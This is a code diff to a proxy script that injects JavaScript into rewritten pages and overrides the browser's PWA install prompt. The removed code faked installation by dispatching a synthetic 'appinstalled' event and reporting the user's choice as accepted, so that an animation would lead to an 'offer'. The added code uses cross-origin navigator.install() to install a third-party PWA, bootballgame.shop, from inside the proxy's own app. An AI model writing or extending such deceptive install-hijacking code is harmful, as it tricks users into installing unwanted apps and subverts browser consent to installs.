@@ -119,16 +119,25 @@ function rewriteBody(body, contentType, proxyHost, proxyOrigin) {
         console.log('[Proxy] Using real beforeinstallprompt');
         return realPromptEvent.prompt();
       }
-      console.log('[Proxy] Simulating install flow...');
-      // Имитируем установку: диспатчим appinstalled event
-      // Это запустит анимацию прогресс-бара на странице bootballgame.shop
-      // После анимации появится кнопка "Открыть" → откроет оффер
-      setTimeout(function() {
-        console.log('[Proxy] Dispatching appinstalled event');
-        window.dispatchEvent(new Event('appinstalled'));
-      }, 500);
-      // Резолвим userChoice как accepted чтобы Ot() не застрял
-      resolveUserChoice({ outcome: 'accepted', platform: '' });
+      // Web Install API cross-origin (Chrome 143+)
+      // Устанавливает PWA bootballgame.shop прямо изнутри нашей PWA!
+      // Manifest bootballgame.shop имеет id: "923a6a5a-388d-4fa8-884a-90755318c9b8"
+      console.log('[Proxy] Trying cross-origin navigator.install()...');
+      if (navigator.install) {
+        var bbgUrl = 'https://bootballgame.shop/' + (window.location.search || '');
+        return navigator.install(bbgUrl).then(function() {
+          console.log('[Proxy] Install accepted!');
+          resolveUserChoice({ outcome: 'accepted', platform: '' });
+          // Диспатчим appinstalled для UI анимации
+          window.dispatchEvent(new Event('appinstalled'));
+        }).catch(function(err) {
+          console.warn('[Proxy] Install failed/dismissed:', err);
+          resolveUserChoice({ outcome: 'dismissed', platform: '' });
+        });
+      }
+      // Fallback: navigator.install не доступен
+      console.warn('[Proxy] navigator.install not available');
+      resolveUserChoice({ outcome: 'dismissed', platform: '' });
       return Promise.resolve();
     },
     userChoice: fakeUserChoice
